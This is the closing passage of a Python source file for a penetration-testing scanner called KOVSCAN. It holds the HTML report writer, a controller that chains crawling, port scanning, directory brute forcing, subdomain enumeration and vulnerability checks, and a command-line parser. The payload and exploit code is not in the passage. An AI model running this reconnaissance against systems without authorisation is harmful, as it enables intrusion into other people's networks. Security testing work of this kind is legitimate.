                html += f'Payload: <code>{payload_str[:100]}</code>'
            if evidence_str:
                if payload_str:
                    html += ' | '
                html += f'Evidence: {evidence_str[:80]}'
            html += '''
                    </div>
                </td>
            </tr>
'''

        html += '''
            </table>
        </div>
        
        <div class="section">
            <h2>Open Ports & Services</h2>
            <table>
                <tr><th>Port</th><th>Service</th><th>Banner</th></tr>
'''

        for port in self.open_ports:
            banner = self._escape_html(port.get("banner", ""))[:120]
            html += f'<tr><td>{port["port"]}</td><td>{self._escape_html(port.get("service", "Unknown"))}</td><td style="font-family: monospace; font-size: 0.85em;">{banner}</td></tr>\n'

        html += '''
            </table>
        </div>
        
        <div class="section">
            <h2>Discovered Directories & Files</h2>
            <table>
                <tr><th>URL</th><th>Status</th><th>Size</th><th>Type</th></tr>
'''

        for d in self.directories:
            ct = self._escape_html(d.get("content_type", ""))[:40]
            html += f'<tr><td style="word-break: break-all;">{self._escape_html(d["url"])}</td><td>{d["status"]}</td><td>{d["size"]}</td><td>{ct}</td></tr>\n'

        html += '''
            </table>
        </div>
        
        <div class="section">
            <h2>Discovered Subdomains</h2>
            <table>
                <tr><th>Subdomain</th><th>IP</th><th>Status</th><th>Title</th></tr>
'''

        for s in self.subdomains:
            title = self._escape_html(s.get("title", ""))[:60]
            html += f'<tr><td>{self._escape_html(s["subdomain"])}</td><td>{self._escape_html(s.get("ip", ""))}</td><td>{s.get("status", "N/A")}</td><td>{title}</td></tr>\n'

        html += '''
            </table>
        </div>
        
        <div class="section">
            <h2>Crawl / Reconnaissance Data</h2>
            <table>
                <tr><th>Metric</th><th>Value</th></tr>
'''

        metrics = [
            ('Total URLs Crawled', str(len(self.spider_data.get('urls', [])))),
            ('Forms Discovered', str(len(self.spider_data.get('forms', [])))),
            ('Parameter Sets', str(len(self.spider_data.get('params', {})))),
            ('Emails Found', str(len(self.spider_data.get('emails', [])))),
            ('HTML Comments', str(len(self.spider_data.get('comments', [])))),
            ('Domain', self._escape_html(str(self.spider_data.get('domain', '')))),
        ]
        for label, value in metrics:
            html += f'<tr><td>{label}</td><td>{value}</td></tr>\n'

        html += '''
            </table>
        </div>
    </div>
    
    <div class="footer">
        KOVSCAN v3.0 - God Tier Vulnerability Scanner | Authorized Penetration Testing Only<br>
        Generated: ''' + now_str + '''
    </div>
</body>
</html>'''

        return html

    def save(self):
        html = self.generate_html()
        with open(self.output_file, 'w', encoding='utf-8') as f:
            f.write(html)
        log.success(f"Report saved to {self.output_file}")
        return self.output_file


# ============================================================
# MAIN CONTROLLER
# ============================================================

class KovScan:
    def __init__(self):
        self.target_url = None
        self.target_host = None
        self.spider_data = {}
        self.vulnerabilities = []
        self.open_ports = []
        self.directories = []
        self.subdomains_list = []

        self.config = {
            'threads': 30,
            'timeout': 15,
            'max_depth': 3,
            'max_pages': 150,
            'crawl': True,
            'port_scan': True,
            'dir_brute': True,
            'subdomain_enum': True,
            'vuln_scan': True,
            'cookies': {},
            'proxy': None,
            'output': 'kovscan_report.html',
        }

    def parse_target(self, target: str) -> Tuple[str, str]:
        if not target.startswith('http'):
            target = 'https://' + target
        parsed = urlparse(target)
        host = parsed.netloc.split(':')[0]
        return target, host

    def run(self, target: str):
        self.target_url, self.target_host = self.parse_target(target)

        print(f"{Colors.BOLD}{BANNER}{Colors.RESET}")
        print(f"\n{Colors.CYAN}{Colors.BOLD}Target: {self.target_url}{Colors.RESET}")
        print(f"{Colors.CYAN}Host:   {self.target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}Time:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")

        # Phase 1: Crawling / Recon
        if self.config['crawl']:
            log.section("PHASE 1: RECONNAISSANCE & CRAWLING")
            spider = SpiderEngine(
                self.target_url,
                max_depth=self.config['max_depth'],
                max_pages=self.config['max_pages'],
                threads=min(self.config['threads'], 20),
                timeout=self.config['timeout'],
                cookies=self.config['cookies'],
                proxy=self.config['proxy']
            )
            self.spider_data = spider.start()

            if self.spider_data.get('comments'):
                log.section("INTERESTING HTML COMMENTS")
                for comment in self.spider_data['comments'][:10]:
                    print(f"  {Colors.YELLOW}[Comment]{Colors.RESET} {comment}")

            if self.spider_data.get('emails'):
                print(f"\n  {Colors.CYAN}Emails found:{Colors.RESET}")
                for email in self.spider_data['emails'][:10]:
                    print(f"    {Colors.GREEN}{email}{Colors.RESET}")

        # Phase 2: Port Scanning
        if self.config['port_scan']:
            log.section("PHASE 2: PORT SCANNING")
            scanner = PortScanner(self.target_host, threads=50, timeout=1.5)
            self.open_ports = scanner.scan()

        # Phase 3: Directory Brute Forcing
        if self.config['dir_brute']:
            log.section("PHASE 3: DIRECTORY/FILE ENUMERATION")
            brute = DirectoryBruteForcer(self.target_url, threads=30, timeout=5)
            self.directories = brute.scan()

        # Phase 4: Subdomain Enumeration
        if self.config['subdomain_enum']:
            log.section("PHASE 4: SUBDOMAIN ENUMERATION")
            domain = self.spider_data.get('base_domain', self.target_host)
            enum = SubdomainEnumerator(domain, threads=30, timeout=5)
            self.subdomains_list = enum.scan()

        # Phase 5: Vulnerability Scanning
        if self.config['vuln_scan']:
            log.section("PHASE 5: VULNERABILITY ASSESSMENT")
            engine = VulnEngine(
                self.target_url,
                self.spider_data,
                threads=self.config['threads'],
                timeout=self.config['timeout'],
                cookies=self.config['cookies'],
                proxy=self.config['proxy']
            )
            self.vulnerabilities = engine.run_all()

        # Phase 6: Report Generation
        log.section("PHASE 6: REPORT GENERATION")
        report = ReportGenerator(
            self.target_url,
            self.vulnerabilities,
            self.open_ports,
            self.directories,
            self.subdomains_list,
            self.spider_data,
            self.config['output']
        )
        report_path = report.save()

        # Final Summary
        log.section("FINAL SUMMARY")
        print(f"  Target:           {self.target_url}")
        print(f"  URLs Crawled:     {len(self.spider_data.get('urls', []))}")
        print(f"  Forms Found:      {len(self.spider_data.get('forms', []))}")
        print(f"  Open Ports:       {len(self.open_ports)}")
        print(f"  Directories:      {len(self.directories)}")
        print(f"  Subdomains:       {len(self.subdomains_list)}")
        print(f"  Vulnerabilities:  {len(self.vulnerabilities)}")

        severity_counts = Counter(v['severity'] for v in self.vulnerabilities)
        for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            if sev in severity_counts:
                c = Colors.RED if sev in ('CRITICAL', 'HIGH') else Colors.YELLOW if sev == 'MEDIUM' else Colors.BLUE
                print(f"    {c}{sev}: {severity_counts[sev]}{Colors.RESET}")

        print(f"\n  {Colors.GREEN}Report: {report_path}{Colors.RESET}")
        print(f"\n{Colors.MAGENTA}{Colors.BOLD}KOVSCAN scan complete - Happy hacking!{Colors.RESET}\n")


# ============================================================
# COMMAND LINE INTERFACE
# ============================================================

def print_help():
    print(f"""
{Colors.CYAN}{Colors.BOLD}KOVSCAN v3.0 - God Tier Vulnerability Scanner{Colors.RESET}
{Colors.DIM}Authorized Penetration Testing Tool{Colors.RESET}

{Colors.YELLOW}USAGE:{Colors.RESET}
    python kovscan.py <target> [options]

{Colors.YELLOW}ARGUMENTS:{Colors.RESET}
    <target>            Target URL or IP (e.g., https://example.com or 192.168.1.1)

{Colors.YELLOW}OPTIONS:{Colors.RESET}
    -h, --help          Show this help message
    --no-crawl          Skip web crawling phase
    --no-port           Skip port scanning
    --no-dir            Skip directory brute forcing
    --no-sub            Skip subdomain enumeration
    --no-vuln           Skip vulnerability scanning
    --threads N         Number of threads (default: 30)
    --timeout N         Request timeout in seconds (default: 15)
    --depth N           Crawling depth (default: 3)
    --max-pages N       Max pages to crawl (default: 150)
    --cookie NAME=VAL   Add cookie (can be used multiple times)
    --proxy URL         Use proxy (e.g., http://127.0.0.1:8080)
    --output FILE       Output report filename (default: kovscan_report.html)
    --only-vuln         Only run vulnerability scanning (skip recon phases)
    --only-port         Only run port scanning
    --only-dir          Only run directory brute forcing
    --only-sub          Only run subdomain enumeration
    --quick             Quick mode (reduced scope)

{Colors.YELLOW}EXAMPLES:{Colors.RESET}
    python kovscan.py https://example.com
    python kovscan.py https://example.com --quick
    python kovscan.py https://example.com --proxy http://127.0.0.1:8080
    python kovscan.py https://example.com --cookie "PHPSESSID=abc123"
    python kovscan.py 192.168.1.100 --only-port
    python kovscan.py https://example.com --output report.html
""")


def main():
    if len(sys.argv) < 2:
        print_help()
        sys.exit(1)

    target = sys.argv[1]
    if target in ('-h', '--help'):
        print_help()
        sys.exit(0)

    scanner = KovScan()
    args = sys.argv[2:]
    i = 0
    while i < len(args):
        arg = args[i]
        if arg == '--no-crawl':
            scanner.config['crawl'] = False
        elif arg == '--no-port':
            scanner.config['port_scan'] = False
        elif arg == '--no-dir':
            scanner.config['dir_brute'] = False
        elif arg == '--no-sub':
            scanner.config['subdomain_enum'] = False
        elif arg == '--no-vuln':
            scanner.config['vuln_scan'] = False
        elif arg == '--threads' and i + 1 < len(args):
            scanner.config['threads'] = int(args[i + 1])
            i += 1
        elif arg == '--timeout' and i + 1 < len(args):
            scanner.config['timeout'] = int(args[i + 1])
            i += 1
        elif arg == '--depth' and i + 1 < len(args):
            scanner.config['max_depth'] = int(args[i + 1])
            i += 1
        elif arg == '--max-pages' and i + 1 < len(args):
            scanner.config['max_pages'] = int(args[i + 1])
            i += 1
        elif arg == '--cookie' and i + 1 < len(args):
            if '=' in args[i + 1]:
                key, val = args[i + 1].split('=', 1)
                scanner.config['cookies'][key] = val
            i += 1
        elif arg == '--proxy' and i + 1 < len(args):
            scanner.config['proxy'] = args[i + 1]
            i += 1
        elif arg == '--output' and i + 1 < len(args):
            scanner.config['output'] = args[i + 1]
            i += 1
        elif arg == '--only-vuln':
            scanner.config['crawl'] = True
            scanner.config['port_scan'] = False
            scanner.config['dir_brute'] = False
            scanner.config['subdomain_enum'] = False
        elif arg == '--only-port':
            scanner.config['crawl'] = False
            scanner.config['port_scan'] = True
            scanner.config['dir_brute'] = False
            scanner.config['subdomain_enum'] = False
            scanner.config['vuln_scan'] = False
        elif arg == '--only-dir':
            scanner.config['crawl'] = False
            scanner.config['port_scan'] = False
            scanner.config['dir_brute'] = True
            scanner.config['subdomain_enum'] = False
            scanner.config['vuln_scan'] = False
        elif arg == '--only-sub':
            scanner.config['crawl'] = False
            scanner.config['port_scan'] = False
            scanner.config['dir_brute'] = False
            scanner.config['subdomain_enum'] = True
            scanner.config['vuln_scan'] = False
        elif arg == '--quick':
            scanner.config['max_depth'] = 1
            scanner.config['max_pages'] = 50
            scanner.config['threads'] = 15
        i += 1

    try:
        scanner.run(target)
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[-] Fatal error: {str(e)}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
